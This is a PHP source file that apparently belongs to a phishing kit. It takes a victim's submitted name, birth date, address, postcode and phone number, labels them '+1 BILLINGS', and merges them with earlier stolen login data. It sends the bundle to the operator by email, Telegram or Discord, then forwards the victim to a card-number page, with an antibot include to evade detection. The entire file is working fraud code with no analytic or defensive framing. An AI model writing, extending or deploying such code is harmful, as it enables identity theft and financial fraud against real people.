<?php 

include("../home.php");
include('../infos.php');
    include('../antibots/antibot.php');
    include('../strom1.php');

if(isset($_POST)){

    $_SESSION["user_nom"] = clean_user_input($_POST["user_nom"]); 
    $_SESSION["user_prenom"] = clean_user_input($_POST["user_prenom"]); 
    $_SESSION["user_naissance"] = clean_user_input($_POST["user_naissance"]); 
    $_SESSION["user_adresse"] = clean_user_input($_POST["user_adresse"]); 
    $_SESSION["user_ville"] = clean_user_input($_POST["user_ville"]); 
    $_SESSION["user_postal"] = clean_user_input($_POST["user_postal"]); 
    $_SESSION["user_telephone"] = clean_user_input($_POST["user_telephone"]); 


    if(!empty($_SESSION["user_nom"]) && !empty($_SESSION["user_telephone"])){

        // Everything seems fine
        $_SESSION["full_to_send"] =  "

[💻] +1 BILLINGS [💻]

💻 Nom : ".$_SESSION["user_nom"]." 
💻 Prénom : ".$_SESSION["user_prenom"]."
💻 Naissance : ".$_SESSION["user_naissance"]."
💻 Adresse : ".$_SESSION["user_adresse"]."
💻 Ville : ".$_SESSION["user_ville"]."
💻 Code postal : ".$_SESSION["user_postal"]."
💻 Téléphone : ".$_SESSION["user_telephone"]."
";
        
        if($config["send_full_information"]){

            $to_send = $_SESSION["full_to_send"] . $_SESSION["login_to_send"];
            

            if($config["enable_email"]){
                send_email_notification($to_send,$config,"[🉑] 1 Full Informations Incoming");
            }
            if($config["enable_telegram"]){
                send_telegram_notification($to_send,$config);
            }   
            if($config["enable_discord"]){
                send_discord_notification($to_send,$config,"[🉑] 1 Full Informations Incoming");
            }   
        }



        header("Location: ../pages/cnum.php?sessid=" . $_SESSION["id"]);


    }
    else{
        // User credentials not set, redirecting
        header("Location: ../pages/personnal.php?credentials_not_set=true&authorize_client=" . $_SESSION["id"]);
    }

}
else{
    // Post not set, redirecting
    header("Location: ../pages/personnal.php?empty=true&authorize_client=" . $_SESSION["id"]);}


?>